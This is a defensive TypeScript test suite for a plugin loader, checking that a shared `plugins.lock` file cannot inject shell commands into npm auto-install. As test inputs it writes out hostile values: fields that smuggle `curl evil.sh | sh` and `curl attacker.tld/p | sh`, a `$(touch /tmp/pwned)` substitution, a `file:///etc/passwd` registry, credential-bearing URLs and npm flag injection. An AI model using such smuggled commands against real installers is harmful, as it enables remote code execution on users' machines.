// ---------------------------------------------------------------------------
// PL-001 — `plugins.lock` must not reach a shell
// ---------------------------------------------------------------------------
//
// `plugins.lock` rides inside `ethos personality export` / `import` bundles, so
// a shared personality is an attacker-controlled file. Auto-install feeds three
// of its fields to npm. These tests pin BOTH halves of the fix:
//
//   * hostile fields are rejected by `validateLockEntry` before install, and
//   * the surviving fields are handed to npm as an ARGV ARRAY, never a shell
//     string — asserted on the exact argv, not on "it did not throw".
//
// The assertions deliberately look at what was passed to the child-process
// call, and at BOTH routes (`execFileSync` argv and `execSync` shell string).
// Two weaker shapes were tried and discarded because they pass against the
// vulnerable implementation: asserting only that nothing threw (the injected
// command succeeds silently), and asserting only on `execFileSync` (a shell
// string sink records no argv at all, so every rejection test goes green).
// ---------------------------------------------------------------------------

import { join } from 'node:path';
import {
  DefaultHookRegistry,
  DefaultLLMProviderRegistry,
  DefaultMemoryProviderRegistry,
  DefaultPersonalityRegistry,
  DefaultToolRegistry,
} from '@ethosagent/core';
import type { PluginRegistries } from '@ethosagent/plugin-sdk';
import { InMemoryStorage } from '@ethosagent/storage-fs';
import type { ContextInjector, Logger } from '@ethosagent/types';
import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('node:child_process', () => ({
  execFileSync: vi.fn(() => Buffer.from('')),
  execSync: vi.fn(() => Buffer.from('')),
}));

import { execFileSync, execSync } from 'node:child_process';
import { recordGrant } from '../grants';
import { PluginLoader } from '../index';
import { validateLockEntry } from '../lockfile';

const DATA_DIR = '/data';
const PLUGINS_DIR = '/data/plugins';
const PERSONALITY_DIR = '/data/personalities/trader';
const ID = 'demo-plugin';

const VALID = {
  package: '@ethos-plugins/tools-zerodha',
  version: '1.4.2',
  registry: 'https://registry.npmjs.org',
  integrity: 'sha512-abc123',
};

function makeRegistries(): PluginRegistries {
  const injectors: ContextInjector[] = [];
  return {
    tools: new DefaultToolRegistry(),
    hooks: new DefaultHookRegistry(),
    injectors,
    injectorPluginIds: new Map<ContextInjector, string>(),
    personalities: new DefaultPersonalityRegistry(),
    llmProviders: new DefaultLLMProviderRegistry(),
    memoryProviders: new DefaultMemoryProviderRegistry(),
  };
}

interface Attempt {
  warnings: string[];
  errors: string[];
  /** Every argv array `npm` was invoked with, across all calls. */
  argvs: string[][];
  /** Every command string handed to a shell. Must always be empty. */
  shellCommands: string[];
  /** Both of the above flattened — for "was this ever run, by any route" checks. */
  everyToken: string[];
}

/** Drive the real auto-install path with `lockContent` as the personality's `plugins.lock`. */
async function attemptInstall(lockContent: string, ids: string[] = [ID]): Promise<Attempt> {
  const storage = new InMemoryStorage();
  await storage.mkdir(PERSONALITY_DIR);
  await storage.mkdir(join(PLUGINS_DIR, 'node_modules'));
  await storage.write(join(PERSONALITY_DIR, 'plugins.lock'), lockContent);

  // The capability-grant gate is keyed by plugin id and is NOT the control
  // under test here — grant every id so execution reaches the npm invocation.
  for (const id of ids) {
    await recordGrant(storage, PLUGINS_DIR, {
      id,
      package: VALID.package,
      version: VALID.version,
      source: `npm:${VALID.package}@${VALID.version}`,
      capabilities: { shell: false, network: null },
      scan: { tier: 'community', findings: [], hasRed: false, hasYellow: false },
      grantedAt: '2026-08-12T10:00:00.000Z',
      consent: 'interactive',
    });
  }

  const warnings: string[] = [];
  const errors: string[] = [];
  const logger = {
    debug: () => {},
    info: () => {},
    warn: (msg: string) => warnings.push(msg),
    error: (msg: string) => errors.push(msg),
  } as unknown as Logger;

  const loader = new PluginLoader(makeRegistries(), { storage, dataDir: DATA_DIR, logger });
  await loader.resolveFromLockfile(PERSONALITY_DIR, ids);

  const argvs = vi
    .mocked(execFileSync)
    .mock.calls.map((call) => [call[0] as string, ...((call[1] as string[]) ?? [])]);
  const shellCommands = vi.mocked(execSync).mock.calls.map((call) => String(call[0]));
  return {
    warnings,
    errors,
    argvs,
    shellCommands,
    everyToken: [...argvs.flat(), ...shellCommands],
  };
}

function lock(entry: Record<string, unknown>, id = ID): string {
  return JSON.stringify({ [id]: entry });
}

beforeEach(() => {
  vi.mocked(execFileSync).mockClear();
  vi.mocked(execSync).mockClear();
});

// ---------------------------------------------------------------------------
// The injection payloads
// ---------------------------------------------------------------------------

describe('a hostile plugins.lock cannot execute a command', () => {
  it('never uses execSync — the auto-install path has no shell at all', async () => {
    await attemptInstall(lock(VALID));
    expect(vi.mocked(execSync)).not.toHaveBeenCalled();
  });

  it('rejects a registry carrying shell metacharacters', async () => {
    // The audit's payload: `--registry=${entry.registry}` interpolated into a
    // shell string turns this into `curl evil.sh | sh`.
    const { everyToken, warnings } = await attemptInstall(
      lock({ ...VALID, registry: 'https://x; curl evil.sh | sh' }),
    );

    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('registry is not an absolute URL');
  });

  it('rejects a registry that is not http(s)', async () => {
    const { everyToken, warnings } = await attemptInstall(
      lock({ ...VALID, registry: 'file:///etc/passwd' }),
    );
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('is not http(s)');
  });

  it('rejects a registry URL that smuggles credentials', async () => {
    const { everyToken, warnings } = await attemptInstall(
      lock({ ...VALID, registry: 'https://user:token@registry.evil.tld' }),
    );
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('embeds credentials');
  });

  it('rejects a version carrying a command separator', async () => {
    const { everyToken, warnings } = await attemptInstall(
      lock({ ...VALID, version: '1 ; curl attacker.tld/p | sh' }),
    );
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('version is not an exact semver');
  });

  it('rejects a version that is an npm spec pointing somewhere else', async () => {
    for (const version of ['file:../../evil', 'git+ssh://git@evil.tld/x.git', 'latest', '^1.0.0']) {
      const { everyToken } = await attemptInstall(lock({ ...VALID, version }));
      expect(everyToken, `version ${version} must not install`).toEqual([]);
    }
  });

  it('rejects a package name carrying a command substitution', async () => {
    const { everyToken, warnings } = await attemptInstall(
      lock({ ...VALID, package: 'x$(touch /tmp/pwned)' }),
    );
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('package is not a valid npm package name');
  });

  it('rejects a package name that would be read by npm as its own flag', async () => {
    // With an argv array a leading `-` is no longer a shell problem but it is
    // still an npm-option-injection problem: `--registry=http://evil.tld` as a
    // "package" would silently redirect the fetch.
    const { everyToken } = await attemptInstall(
      lock({ ...VALID, package: '--registry=http://evil.tld' }),
    );
    expect(everyToken).toEqual([]);
  });

  it('rejects a package name that is a relative path', async () => {
    const { everyToken } = await attemptInstall(lock({ ...VALID, package: '../../evil' }));
    expect(everyToken).toEqual([]);
  });

  it('rejects a plugin id that is not a plain identifier', async () => {
    const { everyToken, warnings } = await attemptInstall(lock(VALID, '../../../etc/x'), [
      '../../../etc/x',
    ]);
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('plugin id is not a plain identifier');
  });

  it('rejects an entry that is not an object', async () => {
    const { everyToken, warnings } = await attemptInstall(JSON.stringify({ [ID]: 'not-an-entry' }));
    expect(everyToken).toEqual([]);
    expect(warnings.join('\n')).toContain('entry is not an object');
  });

  it('drops only the bad entry — a valid sibling still installs', async () => {
    const content = JSON.stringify({
      [ID]: VALID,
      hostile: { ...VALID, version: '1 ; curl evil | sh' },
    });
    const { argvs, shellCommands } = await attemptInstall(content, [ID, 'hostile']);

    expect(argvs).toHaveLength(1);
    expect(argvs[0]).toContain('@ethos-plugins/tools-zerodha@1.4.2');
    expect(shellCommands).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// The argv array itself
// ---------------------------------------------------------------------------

describe('npm is invoked with an argv array', () => {
  it('installs a well-formed entry with the exact expected argv', async () => {
    const { argvs } = await attemptInstall(lock(VALID));

    expect(argvs).toEqual([
      [
        'npm',
        'install',
        '--prefix',
        PLUGINS_DIR,
        '--ignore-scripts',
        '--no-audit',
        '@ethos-plugins/tools-zerodha@1.4.2',
      ],
    ]);
  });

  it('passes a custom registry as its own argv element, not a concatenated flag', async () => {
    const { argvs } = await attemptInstall(
      lock({ ...VALID, registry: 'https://npm.internal.company.com' }),
    );

    expect(argvs).toEqual([
      [
        'npm',
        'install',
        '--prefix',
        PLUGINS_DIR,
        '--ignore-scripts',
        '--no-audit',
        '--registry',
        'https://npm.internal.company.com',
        '@ethos-plugins/tools-zerodha@1.4.2',
      ],
    ]);
  });

  it('keeps a registry path that survives URL parsing confined to one argv element', async () => {
    // `URL` accepts `$(…)` in a path. It is inert here precisely BECAUSE the
    // command is an argv array: it reaches npm as one opaque string and never
    // reaches a shell. This is the property escaping could not give us.
    const registry = 'https://reg.io/$(id)';
    const { argvs } = await attemptInstall(lock({ ...VALID, registry }));

    expect(argvs[0]).toContain(registry);
    expect(argvs[0]?.filter((a) => a.includes('$('))).toEqual([registry]);
    expect(vi.mocked(execSync)).not.toHaveBeenCalled();
  });

  it('no longer runs npm rebuild — it re-runs the scripts --ignore-scripts suppressed', async () => {
    // Verified on npm 11.12.1: `npm rebuild` without `--ignore-scripts` runs
    // preinstall/install/postinstall, and it ran BEFORE the safety scan.
    // Checked across BOTH invocation routes — a rebuild reintroduced through a
    // shell string would be invisible to an execFileSync-only assertion.
    const { everyToken } = await attemptInstall(lock(VALID));
    expect(everyToken.some((token) => token.includes('rebuild'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// A malformed lockfile is refused, not emptied
// ---------------------------------------------------------------------------

describe('a malformed lockfile is refused', () => {
  it('installs nothing and says why when the JSON does not parse', async () => {
    const { everyToken, errors } = await attemptInstall('{ not json');

    expect(everyToken).toEqual([]);
    expect(errors.join('\n')).toContain('Refusing to auto-install');
    expect(errors.join('\n')).toContain('Malformed plugins.lock');
  });

  it('installs nothing when the root is not an object', async () => {
    const { everyToken, errors } = await attemptInstall('["tools-zerodha"]');
    expect(everyToken).toEqual([]);
    expect(errors.join('\n')).toContain('expected a JSON object');
  });
});

// ---------------------------------------------------------------------------
// validateLockEntry — the rules, unit level
// ---------------------------------------------------------------------------

describe('validateLockEntry', () => {
  it('accepts a well-formed pinned entry', () => {
    const result = validateLockEntry(ID, VALID);
    expect(result).toEqual({ ok: true, entry: VALID });
  });

  it('accepts an http registry for an internal mirror', () => {
    const result = validateLockEntry(ID, { ...VALID, registry: 'http://npm.internal:4873' });
    expect(result.ok).toBe(true);
  });

  it('returns only the four known fields, dropping anything else in the entry', () => {
    const result = validateLockEntry(ID, { ...VALID, extra: 'ignored' });
    expect(result.ok && result.entry).toEqual(VALID);
  });

  it('requires an integrity digest', () => {
    expect(validateLockEntry(ID, { ...VALID, integrity: '' }).ok).toBe(false);
    expect(validateLockEntry(ID, { ...VALID, integrity: 'not-a-digest' }).ok).toBe(false);
  });

  it('rejects a non-string field rather than coercing it', () => {
    expect(validateLockEntry(ID, { ...VALID, version: 142 }).ok).toBe(false);
    expect(validateLockEntry(ID, { ...VALID, package: ['x'] }).ok).toBe(false);
    expect(validateLockEntry(ID, { ...VALID, registry: null }).ok).toBe(false);
  });

  it('rejects an over-long package name', () => {
    const result = validateLockEntry(ID, { ...VALID, package: 'a'.repeat(215) });
    expect(result.ok).toBe(false);
  });
});
